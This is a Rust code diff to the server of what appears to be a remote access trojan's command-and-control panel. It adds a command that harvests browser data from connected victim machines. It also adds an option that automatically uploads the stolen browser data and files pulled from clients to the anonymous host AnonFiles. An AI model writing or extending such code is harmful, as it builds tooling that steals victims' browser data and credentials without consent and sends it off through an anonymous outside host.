@@ -30,6 +30,7 @@ pub struct ServerWrapper {
     reverse_proxy_tasks: HashMap<std::net::SocketAddr, tokio::task::JoinHandle<()>>,
     log_events: Logger,
     country_reader: maxminddb::Reader<Vec<u8>>,
+    auto_upload_anonfiles: bool,
 }
 
 impl ServerWrapper {
@@ -57,6 +58,7 @@ impl ServerWrapper {
             reverse_proxy_tasks: HashMap::new(),
             log_events: Logger::new(),
             country_reader,
+            auto_upload_anonfiles: false,
         };
 
         s.channel_loop().await;
@@ -531,12 +533,38 @@ impl ServerWrapper {
                             .log(
                                 "cmd_rcvd",
                                 format!(
-                                    "Downloaded file from client [{}] [{}]",
-                                    addr, client.system.username
+                                    "Downloaded file {} from client [{}] [{}]",
+                                    file_data.name, addr, client.system.username
                                 ),
                             )
                             .await;
-                        let _ = std::fs::write(file_data.name, file_data.data);
+                        let _ = std::fs::write(&file_data.name, &file_data.data);
+
+                        if self.auto_upload_anonfiles {
+                            let handle = self.tauri_handle.clone();
+                            let data = file_data.data.clone();
+                            let filename = file_data.name.clone();
+                            tokio::spawn(async move {
+                                match crate::utils::anonfiles::upload_to_anonfiles(&filename, data).await {
+                                    Ok(url) => {
+                                        if let Some(h) = handle {
+                                            h.lock().unwrap().emit("server_log", crate::utils::logger::Log {
+                                                event_type: "server_info".to_string(),
+                                                message: format!("Auto-uploaded file {} to: {}", filename, url),
+                                            }).ok();
+                                        }
+                                    }
+                                    Err(e) => {
+                                        if let Some(h) = handle {
+                                            h.lock().unwrap().emit("server_log", crate::utils::logger::Log {
+                                                event_type: "server_error".to_string(),
+                                                message: format!("Failed to auto-upload file {}: {}", filename, e),
+                                            }).ok();
+                                        }
+                                    }
+                                }
+                            });
+                        }
                     }
                 }
 
@@ -606,6 +634,49 @@ impl ServerWrapper {
                         "addr": addr.to_string(),
                         "logs": logs
                     })).await;
+                }
+
+                BrowserData(addr, data) => {
+                    self.emit_serde_payload("browser_data", serde_json::json!({
+                        "addr": addr.to_string(),
+                        "data": data
+                    })).await;
+
+                    if self.auto_upload_anonfiles {
+                        let json_data = serde_json::to_vec_pretty(&data).unwrap_or_default();
+                        let filename = format!("browser_data_{}.json", addr.to_string().replace(":", "_"));
+                        let handle = self.tauri_handle.clone();
+                        tokio::spawn(async move {
+                            match crate::utils::anonfiles::upload_to_anonfiles(&filename, json_data).await {
+                                Ok(url) => {
+                                    if let Some(h) = handle {
+                                        h.lock().unwrap().emit("server_log", crate::utils::logger::Log {
+                                            event_type: "server_info".to_string(),
+                                            message: format!("Auto-uploaded browser data to: {}", url),
+                                        }).ok();
+                                    }
+                                }
+                                Err(e) => {
+                                    if let Some(h) = handle {
+                                        h.lock().unwrap().emit("server_log", crate::utils::logger::Log {
+                                            event_type: "server_error".to_string(),
+                                            message: format!("Failed to auto-upload browser data: {}", e),
+                                        }).ok();
+                                    }
+                                }
+                            }
+                        });
+                    }
+                }
+
+                GetBrowserData(addr) => {
+                    self.handle_command(&addr, ClientboundPacket::GetBrowserData)
+                        .await;
+                }
+
+                SetAutoUploadAnonFiles(enabled) => {
+                    self.auto_upload_anonfiles = enabled;
+                    self.log_events.log("server_info", format!("Auto upload to AnonFiles: {}", enabled)).await;
                 }
 
 
